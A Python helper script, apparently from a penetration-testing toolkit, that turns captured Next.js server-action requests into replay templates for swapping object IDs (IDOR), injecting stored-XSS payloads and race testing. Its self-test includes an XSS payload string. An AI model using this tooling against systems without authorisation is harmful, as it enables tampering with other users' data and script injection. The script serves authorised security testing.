#!/usr/bin/env python3
"""
replay_server_action.py -- turn one captured Next.js / RSC server-action request into a
replay template with id-swap / payload-inject slots (stdlib only).

WHY THIS EXISTS (capture->replay wiring):
  A Next.js *server action* (the `useActionState` / `<form action={…}>` writes: login,
  updateDisplayName, manageBuild, …) is NOT replayable from scratch. The browser POSTs to the
  page URL with a `Next-Action: <id>` header and a `multipart/form-data` body whose FIRST part
  encodes the bound closure / `prevState` argument. That bound-state encoding is generated by
  the client bundle; a hand-built `curl`/fuzzer POST (even with the right action id + form
  fields) returns a 500 `digest` because the bound arg is missing or malformed. So every
  authz/write executor that assumes a curl-constructible request (bola-bfla / authz-context
  "swap object id", business-logic, xss-stored, race-condition) cannot reach these writes.

THE METHOD THIS ENCODES (see _contract/proxy.md §4a):
  Drive the action ONCE in a real browser THROUGH the connected proxy; the genuine multipart
  `Next-Action` POST is captured + exported to `proxy-context/http_history.json`. Then REPLAY
  that stored request byte-for-byte and TAMPER only the one field under test -- swap the object
  id (BOLA/IDOR write), inject the stored-XSS payload, mutate a price/state field, or fire the
  replay as a parallel burst (race) -- leaving the bound-state part UNTOUCHED so the server
  still accepts it. You mutate a GENUINE captured request instead of synthesizing one.

WHAT THIS MODULE DOES (pure logic, no network):
  - reads the `proxy-context/http_history.json` shape (an `exchanges[]` list, each with
    `req.headers` = [[name,value],…] and `req.body` = the raw request body string);
  - finds the server-action entries (those carrying a `Next-Action` request header);
  - parses the multipart body into parts, marking the bound-state part(s) DO-NOT-TOUCH and the
    remaining form fields as tamperable slots;
  - applies an id-swap / payload-inject to a named field and re-serializes the body
    BYTE-FOR-BYTE except the tampered value (an untouched template round-trips exactly).
  The executor wires the rendered template to its interceptor replay / Turbo Intruder and its
  scope-rate ladder. This keeps the dangerous bit (what you change) deterministic + reviewable.

`python scripts/replay_server_action.py <http_history.json> --list` lists the server actions.
`python scripts/replay_server_action.py --selftest` runs the self-test (no network).
"""
from __future__ import annotations

import copy
import json
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Sequence, Tuple

CRLF = "\r\n"
NEXT_ACTION_HEADER = "next-action"
# Parts Next.js generates to carry the action reference / bound closure state. These are
# NEVER tampered -- changing them breaks the request (500 digest). Heuristic: the first part
# is the bound `prevState` arg, and any part whose field name starts with `$ACTION` is an
# action-reference part.
_BOUND_STATE_PREFIX = "$ACTION"
_DISPOSITION_NAME = re.compile(r'name="([^"]*)"')


# --------------------------------------------------------------------------------------
# Header + content-type helpers
# --------------------------------------------------------------------------------------
def header_get(headers: Sequence[Sequence[str]], name: str) -> Optional[str]:
    """Case-insensitive first-match lookup over a [[name, value], …] header list."""
    low = name.lower()
    for pair in headers or []:
        if len(pair) >= 2 and str(pair[0]).lower() == low:
            return str(pair[1])
    return None


def parse_boundary(content_type: Optional[str]) -> Optional[str]:
    """Extract the multipart boundary from a Content-Type value (or None)."""
    if not content_type or "multipart/form-data" not in content_type.lower():
        return None
    m = re.search(r'boundary=(?:"([^"]+)"|([^;,\s]+))', content_type, re.IGNORECASE)
    if not m:
        return None
    return m.group(1) if m.group(1) is not None else m.group(2)


def is_server_action(exchange: Dict) -> bool:
    """True iff the request carries a `Next-Action` header (a Next.js/RSC server action)."""
    req = exchange.get("req") or {}
    return header_get(req.get("headers") or [], NEXT_ACTION_HEADER) is not None


def find_server_actions(history: Dict) -> List[Dict]:
    """Return the exchanges in an http_history.json that are server-action requests."""
    exchanges = history.get("exchanges")
    if exchanges is None and isinstance(history, list):  # tolerate a legacy flat array
        exchanges = history
    return [e for e in (exchanges or []) if is_server_action(e)]


def select_exchange(history: Dict, entry_id: Optional[str] = None) -> Dict:
    """Pick one server-action exchange: by `id`, or the sole one if unambiguous."""
    actions = find_server_actions(history)
    if entry_id is not None:
        for e in actions:
            if str(e.get("id")) == str(entry_id):
                return e
        raise KeyError(f"no server-action exchange with id={entry_id!r}")
    if not actions:
        raise KeyError("no server-action (Next-Action) exchange found in history")
    if len(actions) > 1:
        ids = ", ".join(str(e.get("id")) for e in actions)
        raise ValueError(f"multiple server-action exchanges ({ids}); pass entry_id to pick one")
    return actions[0]


# --------------------------------------------------------------------------------------
# Multipart parse / reconstruct (byte-faithful)
# --------------------------------------------------------------------------------------
@dataclass
class Part:
    """One multipart field. `raw` is the exact chunk between delimiters; value_start/value_end
    index the field VALUE inside `raw`, so a tamper is a pure substring splice (exact)."""

    name: str
    role: str  # "bound-state" (do-not-touch) | "field" (tamperable)
    raw: str
    value_start: int
    value_end: int

    @property
    def value(self) -> str:
        return self.raw[self.value_start : self.value_end]


@dataclass
class ReplayTemplate:
    exchange_id: Optional[str]
    method: str
    host: str
    path: str
    headers: List[List[str]]
    action_id: Optional[str]
    content_type: Optional[str]
    boundary: Optional[str]
    is_multipart: bool
    raw_body: str
    # multipart reconstruction state:
    preamble: str = ""
    epilogue: str = ""
    parts: List[Part] = field(default_factory=list)

    def tamperable_fields(self) -> List[str]:
        """Names of fields that may be swapped/injected (bound-state parts excluded)."""
        return [p.name for p in self.parts if p.role == "field"]

    def bound_state_fields(self) -> List[str]:
        return [p.name for p in self.parts if p.role == "bound-state"]


def _classify_role(index: int, name: str) -> str:
    if index == 0 or name.startswith(_BOUND_STATE_PREFIX):
        return "bound-state"
    return "field"


def parse_multipart(body: str, boundary: str) -> Tuple[str, str, List[Part]]:
    """Split a multipart body into (preamble, epilogue, parts), each part byte-faithful.

    Reconstruction is exact: `delim.join([preamble] + [p.raw for p in parts] + [epilogue])`
    reproduces `body` when no value is tampered.
    """
    delim = "--" + boundary
    chunks = body.split(delim)
    if len(chunks) < 3:
        # Not a well-formed multipart body (no parts / no closing delimiter).
        return body, "", []
    preamble = chunks[0]
    epilogue = chunks[-1]
    parts: List[Part] = []
    for i, raw in enumerate(chunks[1:-1]):
        sep = CRLF + CRLF
        idx = raw.find(sep)
        if idx == -1:
            # A chunk with no header/body separator -- keep it verbatim, no slot.
            parts.append(Part(name="", role="bound-state", raw=raw, value_start=len(raw), value_end=len(raw)))
            continue
        header_block = raw[:idx]
        value_start = idx + len(sep)
        value_end = len(raw) - len(CRLF) if raw.endswith(CRLF) else len(raw)
        if value_end < value_start:
            value_end = value_start
        nm = _DISPOSITION_NAME.search(header_block)
        name = nm.group(1) if nm else ""
        parts.append(Part(name=name, role=_classify_role(i, name), raw=raw, value_start=value_start, value_end=value_end))
    return preamble, epilogue, parts


def build_replay_template(exchange: Dict) -> ReplayTemplate:
    """Turn one captured server-action exchange into a ReplayTemplate with tamper slots."""
    req = exchange.get("req") or {}
    headers = [list(h) for h in (req.get("headers") or [])]
    body = req.get("body") or ""
    content_type = header_get(headers, "content-type")
    action_id = header_get(headers, NEXT_ACTION_HEADER)
    boundary = parse_boundary(content_type)
    tpl = ReplayTemplate(
        exchange_id=exchange.get("id"),
        method=str(exchange.get("method") or req.get("method") or "POST"),
        host=str(exchange.get("host") or ""),
        path=str(exchange.get("path") or ""),
        headers=headers,
        action_id=action_id,
        content_type=content_type,
        boundary=boundary,
        is_multipart=boundary is not None,
        raw_body=body,
    )
    if boundary is not None:
        tpl.preamble, tpl.epilogue, tpl.parts = parse_multipart(body, boundary)
    return tpl


# --------------------------------------------------------------------------------------
# Tamper + render
# --------------------------------------------------------------------------------------
def _find_field(tpl: ReplayTemplate, name: str) -> Part:
    for p in tpl.parts:
        if p.name == name:
            if p.role == "bound-state":
                raise ValueError(
                    f"field {name!r} is a bound-state part (do-not-touch) -- tampering it breaks the replay"
                )
            return p
    raise KeyError(f"no tamperable field named {name!r}; have {tpl.tamperable_fields()}")


def _splice_value(tpl: ReplayTemplate, name: str, new_value: str) -> ReplayTemplate:
    out = copy.deepcopy(tpl)
    p = _find_field(out, name)
    p.raw = p.raw[: p.value_start] + new_value + p.raw[p.value_end :]
    p.value_end = p.value_start + len(new_value)
    out.raw_body = render_body(out)
    return out


def apply_id_swap(tpl: ReplayTemplate, field_name: str, new_id: str) -> ReplayTemplate:
    """Swap an object-id field's value (BOLA/IDOR write). Refuses bound-state parts."""
    return _splice_value(tpl, field_name, new_id)


def apply_payload_inject(
    tpl: ReplayTemplate, field_name: str, payload: str, mode: str = "replace"
) -> ReplayTemplate:
    """Inject a payload (stored-XSS, etc.) into a field. mode=replace|append|prepend."""
    if mode == "replace":
        new_value = payload
    else:
        cur = _find_field(tpl, field_name).value
        if mode == "append":
            new_value = cur + payload
        elif mode == "prepend":
            new_value = payload + cur
        else:
            raise ValueError(f"unknown inject mode {mode!r} (replace|append|prepend)")
    return _splice_value(tpl, field_name, new_value)


def render_body(tpl: ReplayTemplate) -> str:
    """Reconstruct the request body. Exact round-trip when nothing was tampered."""
    if not tpl.is_multipart or not tpl.parts:
        return tpl.raw_body
    delim = "--" + tpl.boundary
    return delim.join([tpl.preamble] + [p.raw for p in tpl.parts] + [tpl.epilogue])


def to_dict(tpl: ReplayTemplate) -> Dict:
    """A JSON-serializable view of the template + its slots (for the executor / CLI)."""
    return {
        "exchange_id": tpl.exchange_id,
        "method": tpl.method,
        "host": tpl.host,
        "path": tpl.path,
        "action_id": tpl.action_id,
        "content_type": tpl.content_type,
        "is_multipart": tpl.is_multipart,
        "headers": tpl.headers,
        "bound_state_fields": tpl.bound_state_fields(),
        "tamperable_fields": [
            {"name": p.name, "value": p.value} for p in tpl.parts if p.role == "field"
        ],
        "body": render_body(tpl),
        "note": (
            "Bound-state fields are do-not-touch (they carry the Next.js closure/prevState "
            "encoding). Replay this request through the proxy and tamper only a tamperable "
            "field: id-swap -> bola-bfla/idor, payload-inject -> xss-stored, value/step -> "
            "business-logic, parallel burst -> race-condition. See _contract/proxy.md §4a."
        ),
    }


# --------------------------------------------------------------------------------------
# Self-test (no network; pure logic). Mirrors the CI convention of the other helpers.
# --------------------------------------------------------------------------------------
def _sample_history() -> Dict:
    """A faithful-shape http_history.json with one server-action POST + one plain GET."""
    bnd = "----WebKitFormBoundaryABC123"
    # Part 0 = bound `prevState` (do-not-touch); part "1" = displayName (a tamperable field);
    # part "userId" = the object id (tamperable). CRLF line endings, as a real capture has.
    body = CRLF.join(
        [
            f"--{bnd}",
            'Content-Disposition: form-data; name="1_$ACTION_ID_abcdef"',
            "",
            "$ACTION_REF_0_bound_state_blob",
            f"--{bnd}",
            'Content-Disposition: form-data; name="displayName"',
            "",
            "Alice",
            f"--{bnd}",
            'Content-Disposition: form-data; name="userId"',
            "",
            "1001",
            f"--{bnd}--",
            "",
        ]
    )
    return {
        "engagement": "demo",
        "source": "caido",
        "exchanges": [
            {
                "id": "h7",
                "host": "app.acme.io",
                "method": "POST",
                "path": "/dashboard/profile",
                "status": 200,
                "mime": "text/x-component",
                "req": {
                    "headers": [
                        ["Content-Type", f"multipart/form-data; boundary={bnd}"],
                        ["Next-Action", "7f3c1a9b20"],
                        ["Cookie", "sid=‹redacted›"],
                    ],
                    "body": body,
                },
                "res": {"headers": [], "body": "1:[...]"},
            },
            {
                "id": "h1",
                "host": "app.acme.io",
                "method": "GET",
                "path": "/dashboard",
                "status": 200,
                "req": {"headers": [["Accept", "text/html"]], "body": ""},
            },
        ],
    }


def selftest() -> None:
    hist = _sample_history()

    # 1) Only the Next-Action POST is identified as a server action.
    actions = find_server_actions(hist)
    assert [e["id"] for e in actions] == ["h7"], "only the Next-Action entry is a server action"
    assert is_server_action(actions[0]) and not is_server_action(hist["exchanges"][1])

    # 2) The template exposes the action id, the multipart boundary, and the right slots.
    tpl = build_replay_template(actions[0])
    assert tpl.action_id == "7f3c1a9b20"
    assert tpl.is_multipart and tpl.boundary == "----WebKitFormBoundaryABC123"
    # The first part AND the $ACTION part are bound-state; the real form fields are tamperable.
    assert tpl.tamperable_fields() == ["displayName", "userId"], tpl.tamperable_fields()
    assert "1_$ACTION_ID_abcdef" in tpl.bound_state_fields()

    # 3) ROUND-TRIP: an untouched template reconstructs the body byte-for-byte.
    assert render_body(tpl) == actions[0]["req"]["body"], "untouched render must be exact"

    # 4) id-swap changes ONLY the userId value; everything else (incl. bound state) is intact.
    swapped = apply_id_swap(tpl, "userId", "1002")
    body2 = render_body(swapped)
    assert "$ACTION_REF_0_bound_state_blob" in body2, "bound state must survive the swap"
    assert 'name="userId"' + CRLF + CRLF + "1002" + CRLF in body2
    assert "1001" not in body2.split('name="userId"')[1], "old id must be gone from that field"
    assert "Alice" in body2, "the other field is untouched"
    # and the original template is unchanged (immutability).
    assert render_body(tpl) == actions[0]["req"]["body"]

    # 5) payload-inject (stored-XSS) replaces the displayName value; bound state intact.
    xss = '"><img src=x onerror=alert(1)>'
    inj = apply_payload_inject(tpl, "displayName", xss)
    body3 = render_body(inj)
    assert xss in body3 and "$ACTION_REF_0_bound_state_blob" in body3
    assert render_body(parse_and_build(body3, tpl)) == body3  # re-parse is stable

    # 6) append / prepend modes.
    app = apply_payload_inject(tpl, "displayName", "X", mode="append")
    assert "AliceX" in render_body(app)
    pre = apply_payload_inject(tpl, "displayName", "X", mode="prepend")
    assert "XAlice" in render_body(pre)

    # 7) Tampering a bound-state part is REFUSED (the whole point -- it would 500).
    try:
        apply_id_swap(tpl, "1_$ACTION_ID_abcdef", "nope")
        raise AssertionError("tampering a bound-state part must raise")
    except ValueError:
        pass

    # 8) An unknown field name is refused with the available slots listed.
    try:
        apply_id_swap(tpl, "doesNotExist", "x")
        raise AssertionError("unknown field must raise")
    except KeyError:
        pass

    # 9) select_exchange: by id, and the sole-action convenience.
    assert select_exchange(hist, "h7")["id"] == "h7"
    assert select_exchange(hist)["id"] == "h7"
    try:
        select_exchange(hist, "nope")
        raise AssertionError("bad id must raise")
    except KeyError:
        pass

    # 10) to_dict surfaces a usable, JSON-safe template.
    d = to_dict(swapped)
    assert d["action_id"] == "7f3c1a9b20"
    assert {f["name"] for f in d["tamperable_fields"]} == {"displayName", "userId"}
    assert json.dumps(d)  # serializable

    print("replay_server_action selftest: OK")


def parse_and_build(body: str, like: ReplayTemplate) -> ReplayTemplate:
    """Test helper: wrap a raw body back into a template with the same boundary/headers."""
    ex = {
        "id": like.exchange_id,
        "host": like.host,
        "path": like.path,
        "method": like.method,
        "req": {"headers": like.headers, "body": body},
    }
    return build_replay_template(ex)


# --------------------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------------------
def _main(argv: Sequence[str]) -> int:
    import argparse

    ap = argparse.ArgumentParser(
        description="Extract a captured Next.js server-action request from an "
        "http_history.json into a replay template with id-swap / payload-inject slots."
    )
    ap.add_argument("history", nargs="?", help="path to proxy-context/http_history.json")
    ap.add_argument("--selftest", action="store_true", help="run the self-test and exit")
    ap.add_argument("--list", action="store_true", help="list server-action entries")
    ap.add_argument("--id", help="select the exchange with this id")
    ap.add_argument("--swap", action="append", default=[], metavar="FIELD=VALUE",
                    help="swap a field's value (repeatable)")
    ap.add_argument("--inject", action="append", default=[], metavar="FIELD=PAYLOAD",
                    help="inject a payload into a field (repeatable)")
    ap.add_argument("--emit-body", action="store_true",
                    help="print the reconstructed request body instead of the template JSON")
    args = ap.parse_args(list(argv))

    if args.selftest:
        selftest()
        return 0
    if not args.history:
        ap.error("a history path is required (or use --selftest)")

    with open(args.history, "r", encoding="utf-8") as fh:
        history = json.load(fh)

    if args.list:
        rows = []
        for e in find_server_actions(history):
            t = build_replay_template(e)
            rows.append({
                "id": e.get("id"), "method": t.method, "path": t.path,
                "action_id": t.action_id, "tamperable_fields": t.tamperable_fields(),
            })
        print(json.dumps(rows, indent=2, ensure_ascii=False))
        return 0

    tpl = build_replay_template(select_exchange(history, args.id))
    for spec in args.swap:
        name, _, value = spec.partition("=")
        tpl = apply_id_swap(tpl, name, value)
    for spec in args.inject:
        name, _, payload = spec.partition("=")
        tpl = apply_payload_inject(tpl, name, payload)

    if args.emit_body:
        # Write raw bytes (no newline translation) so CRLF delimiters survive on any platform.
        import sys as _sys

        _sys.stdout.buffer.write(render_body(tpl).encode("utf-8"))
    else:
        print(json.dumps(to_dict(tpl), indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    import sys

    raise SystemExit(_main(sys.argv[1:]))
